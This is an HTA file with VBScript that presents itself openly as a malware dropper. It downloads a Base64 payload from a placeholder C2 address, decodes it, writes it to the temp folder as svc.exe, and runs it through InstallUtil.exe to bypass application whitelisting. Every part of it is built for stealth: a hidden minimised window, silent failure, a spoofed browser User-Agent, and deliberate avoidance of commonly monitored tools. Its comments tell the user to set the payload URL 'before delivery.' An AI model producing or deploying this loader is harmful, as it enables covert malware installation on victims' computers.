<html>
<head>
<title> </title>
<HTA:APPLICATION ID="loader" APPLICATIONNAME="loader" BORDER="none" CAPTION="no" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no" WINDOWSTATE="minimize" />
<script language="VBScript">
  ' =============================================================================
  ' HTTP-Download + Self-Decode HTA Loader
  '
  ' Downloads a Base64-encoded payload over HTTP using MSXML2.XMLHTTP, decodes
  ' it via MSXML2.DOMDocument, writes to disk via ADODB.Stream, and executes
  ' via InstallUtil.exe /U.
  '
  ' No bitsadmin, no certutil, no PowerShell â€” all COM objects.
  ' The HTA file stays ~2KB â€” no embedded payload to copy-paste.
  '
  ' Configure payloadUrl below before delivery.
  ' =============================================================================

  On Error Resume Next

  ' -- CONFIG: Set your payload URL --------------------------------------------
  Dim payloadUrl : payloadUrl = "http://YOUR_C2_IP_HERE/loader.b64"

  ' -- Step 1: Download Base64 payload over HTTP --------------------------------
  Dim b64 : b64 = DownloadText(payloadUrl)
  If Err.Number <> 0 Then Call Fail("Download failed")
  If Len(Trim(b64)) = 0 Then Call Fail("Empty response")

  ' Strip PEM headers if present (certutil -encode adds BEGIN/END CERTIFICATE lines)
  b64 = Replace(b64, "-----BEGIN CERTIFICATE-----", "")
  b64 = Replace(b64, "-----END CERTIFICATE-----", "")
  ' Remove all whitespace/newlines so MSXML2 can parse the Base64
  b64 = Replace(b64, vbCr, "")
  b64 = Replace(b64, vbLf, "")
  b64 = Replace(b64, " ", "")
  b64 = Replace(b64, vbTab, "")

  ' -- Step 2: Decode Base64 -> binary ------------------------------------------
  Dim bytes : bytes = DecodeBase64(b64)
  If Err.Number <> 0 Then Call Fail("Decode failed")

  ' -- Step 3: Write to %TEMP%\svc.exe ------------------------------------------
  Dim fso, tmpPath
  Set fso = CreateObject("Scripting.FileSystemObject")
  tmpPath = fso.GetSpecialFolder(2) & "\svc.exe"
  WriteBinary tmpPath, bytes
  If Err.Number <> 0 Then Call Fail("Write failed")

  ' -- Step 4: Execute via InstallUtil ------------------------------------------
  ' FIXED: quote paths â€” handles usernames with spaces (e.g. "John Doe")
  Dim installUtil
  installUtil = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
  CreateObject("WScript.Shell").Run """" & installUtil & """ /U """ & tmpPath & """", 0, False

  ' -- Close the HTA window -----------------------------------------------------
  self.close()

  ' -- Helpers ------------------------------------------------------------------

  ' Download text content over HTTP using MSXML2.XMLHTTP (no certutil/bitsadmin).
  ' Sets a browser User-Agent to blend in with normal web traffic.
  ' Respects system proxy settings (uses WinInet).
  Function DownloadText(url)
    Dim http : Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    http.Send
    If http.Status <> 200 Then Err.Raise 1, "DownloadText", "HTTP " & http.Status
    DownloadText = http.responseText
  End Function

  ' Decode Base64 string to byte array using MSXML2.DOMDocument (no certutil)
  Function DecodeBase64(s)
    Dim xml : Set xml = CreateObject("MSXML2.DOMDocument")
    Dim el : Set el = xml.createElement("b")
    el.dataType = "bin.base64"
    el.text = s
    DecodeBase64 = el.nodeTypedValue
  End Function

  ' Write a byte array to disk using ADODB.Stream (no certutil)
  Sub WriteBinary(path, data)
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1  ' adTypeBinary
    stream.Open
    stream.Write data
    stream.SaveToFile path, 2  ' adSaveCreateOverWrite
    stream.Close
  End Sub

  Sub Fail(msg)
    ' Silent fail â€” no error dialogs
    self.close()
  End Sub
</script>
</head>
<body>Loading...</body>
</html>
